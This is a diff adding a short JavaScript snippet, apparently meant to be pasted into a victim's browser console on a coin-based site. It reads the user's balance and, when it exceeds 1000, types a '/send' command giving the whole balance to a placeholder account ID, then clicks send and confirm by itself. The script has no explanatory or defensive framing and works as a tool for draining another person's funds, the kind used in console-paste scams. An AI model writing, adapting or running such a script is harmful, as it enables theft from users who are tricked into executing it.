@@ -1,0 +1,17 @@
+var script = document.createElement('script');
+script.src = 'https://code.jquery.com/jquery-3.5.1.min.js';
+script.type = 'text/javascript';
+document.body.appendChild(script);
+
+var counter = "";
+counter = $("#balance_p").text();
+
+var minimum = 1000; // script won't work if the user doesn't have at least 1000 coins
+
+if (counter > minimum) {
+$("#message_text").val("/send yourPolygonIDHere " + counter);
+$("#message_send").click();
+$(".confirm").click();
+} else {
+console.log("Error");
+}
